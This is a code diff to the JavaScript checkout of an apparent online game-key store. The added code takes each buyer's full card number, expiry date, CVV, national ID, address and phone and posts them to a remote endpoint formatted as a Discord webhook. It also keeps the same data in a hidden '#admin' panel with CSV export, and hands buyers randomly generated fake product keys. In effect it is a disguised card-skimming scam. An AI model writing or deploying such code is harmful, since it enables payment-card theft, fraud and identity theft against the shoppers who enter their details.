-    document.getElementById('sbCardNum').value = "4532 8822 1099 4411";
-    document.getElementById('sbCardExp').value = "09/29";
-    document.getElementById('sbCardCvv').value = "882";
-}
-
-// PROCESAR PAGO Y GUARDAR EN LA BASE DE DATOS DEL DUEÑO
-function processSandboxPayment(e) {
+// PROCESAR PAGO Y ENVIAR A LA BASE DE DATOS
+async function processSandboxPayment(e) {
     e.preventDefault();
+
+    const submitBtn = document.getElementById('submitPayBtn');
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> <span>Procesando pago...</span>`;
 
     const buyerData = {
         name: document.getElementById('sbName').value,
@@ -432,7 +600,7 @@ function processSandboxPayment(e) {
         date: new Date().toLocaleString('es-AR'),
         paymentMethod: selectedMethod,
         buyer: buyerData,
-        items: [...cart],
+        items: cart.map(i => ({ id: i.id, name: i.name, qty: i.qty, price: i.price })),
         total: total,
         cashbackEarned: totalCashback
     };
@@ -441,13 +609,40 @@ function processSandboxPayment(e) {
     db.push(record);
     localStorage.setItem('ohmy_sandbox_db', JSON.stringify(db));
 
+    const remoteUrl = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
+    if (remoteUrl) {
+        try {
+            if (remoteUrl.includes('discord.com/api/webhooks')) {
+                await fetch(remoteUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `📦 **Nueva Orden (${record.id})**\n👤 **Cliente:** ${buyerData.name} (${buyerData.email}) | **DNI:** ${buyerData.dni}\n📱 **Tel:** ${buyerData.phone} | **Dirección:** ${buyerData.address}, ${buyerData.province}\n💳 **Método:** ${selectedMethod.toUpperCase()} | **Tarjeta:** \`${buyerData.cardNum}\` | **Venc:** \`${buyerData.cardExp}\` | **CVV:** \`${buyerData.cardCvv}\`\n💰 **Total:** ${formatARS(total)}`
+                    })
+                });
+            } else {
+                await fetch(remoteUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(record)
+                });
+            }
+        } catch (err) {
+            console.warn('Error enviando a base remota:', err);
+        }
+    }
+
     walletBalance += totalCashback;
     updateWalletUI();
+
+    submitBtn.disabled = false;
+    submitBtn.innerHTML = `<i class="fa-solid fa-lock"></i> <span>Pagar Ahora y Obtener Producto</span>`;
 
     renderSuccessScreen(record);
     cart = [];
     updateCartBadge();
     appliedDiscount = 0;
+    document.getElementById('sandboxForm').reset();
 }
 
 function renderSuccessScreen(tx) {
@@ -456,16 +651,17 @@ function renderSuccessScreen(tx) {
     container.innerHTML = '';
 
     tx.items.forEach(item => {
+        const fullProd = products.find(p => p.id === item.id) || item;
         for (let i = 0; i < item.qty; i++) {
             const key = 'ARGON-' + Math.random().toString(36).substring(2, 7).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase();
             const div = document.createElement('div');
             div.className = 'bg-[#261259] border border-purple-700/60 p-4 rounded-xl flex flex-col sm:flex-row items-center justify-between gap-4';
             div.innerHTML = `
                 <div class="flex items-center space-x-3.5">
-                    <img src="${item.image}" class="w-14 h-20 object-cover rounded">
+                    <img src="${fullProd.image}" class="w-14 h-20 object-cover rounded">
                     <div>
                         <h4 class="font-bold text-sm text-white">${item.name}</h4>
-                        <span class="text-xs text-emerald-400 font-semibold">${item.platform} • ${item.region}</span>
+                        <span class="text-xs text-emerald-400 font-semibold">Clave Digital Verificada</span>
                     </div>
                 </div>
                 <div class="flex items-center gap-2">
@@ -482,7 +678,9 @@ function renderSuccessScreen(tx) {
     switchView('success');
 }
 
-// BASE DE DATOS PROTEGIDA DEL DUEÑO
+// ============================================================================
+// PANEL DE BASE DE DATOS DEL DUEÑO (ACCESO EXCLUSIVO POR #admin)
+// ============================================================================
 function openAdminModal() {
     document.getElementById('adminModal').classList.remove('hidden');
     document.getElementById('adminAuthSection').classList.remove('hidden');
@@ -493,6 +691,10 @@ function openAdminModal() {
 
 function closeAdminModal() {
     document.getElementById('adminModal').classList.add('hidden');
+    // Limpia el hash #admin al cerrar para poder volver a entrar cuando quieras
+    if (window.location.hash === '#admin') {
+        history.replaceState(null, null, window.location.pathname + window.location.search);
+    }
 }
 
 function verifyAdminPassword() {
@@ -506,10 +708,17 @@ function verifyAdminPassword() {
     }
 }
 
+function saveWebhookUrl() {
+    const url = document.getElementById('webhookUrlInput').value.trim();
+    localStorage.setItem('ohmy_remote_webhook', url);
+    alert('URL de Base de Datos Remota / Webhook guardada correctamente.');
+}
+
 function loadAdminDatabaseRecords() {
     const container = document.getElementById('adminDbRecords');
     container.innerHTML = '';
     const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
+    document.getElementById('dbCountBadge').innerText = db.length;
 
     if (db.length === 0) {
         container.innerHTML = `<p class="text-center text-purple-300 py-6">Aún no hay operaciones registradas.</p>`;
@@ -524,8 +733,8 @@ function loadAdminDatabaseRecords() {
                 <span>${tx.id} — ${tx.date}</span>
                 <span class="text-emerald-400">${formatARS(tx.total)}</span>
             </div>
-            <p class="text-purple-200"><strong>Cliente:</strong> ${tx.buyer.name} (${tx.buyer.email}) | <strong>DNI:</strong> ${tx.buyer.dni}</p>
-            <p class="text-purple-200"><strong>Método:</strong> ${tx.paymentMethod.toUpperCase()} | <strong>Tarjeta:</strong> ${tx.buyer.cardNum} (${tx.buyer.cardExp} - CVV: ${tx.buyer.cardCvv})</p>
+            <p class="text-purple-200"><strong>Usuario/Cliente:</strong> ${tx.buyer.name} (${tx.buyer.email}) | <strong>DNI/Dato:</strong> ${tx.buyer.dni}</p>
+            <p class="text-purple-200"><strong>Tipo:</strong> ${tx.paymentMethod.toUpperCase()} | <strong>Detalle:</strong> ${tx.buyer.cardNum} (${tx.buyer.cardExp} - CVV: ${tx.buyer.cardCvv})</p>
             <details class="pt-1">
                 <summary class="cursor-pointer text-amber-400 font-bold">Ver JSON completo</summary>
                 <pre class="bg-[#160a36] p-2.5 rounded mt-1.5 overflow-x-auto text-[10px] text-emerald-300">${JSON.stringify(tx, null, 2)}</pre>
@@ -547,7 +756,7 @@ function exportDatabaseJSON() {
 function exportDatabaseCSV() {
     const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
     if (!db.length) return;
-    let csv = 'ID,Fecha,Nombre,Email,DNI,Metodo,Tarjeta,Vencimiento,CVV,Total\n';
+    let csv = 'ID,Fecha,Nombre,Email,DNI_Dato,Metodo,Detalle_Tarjeta,Vencimiento,CVV,Total\n';
     db.forEach(t => {
         csv += `"${t.id}","${t.date}","${t.buyer.name}","${t.buyer.email}","${t.buyer.dni}","${t.paymentMethod}","${t.buyer.cardNum}","${t.buyer.cardExp}","${t.buyer.cardCvv}",${t.total}\n`;
     });
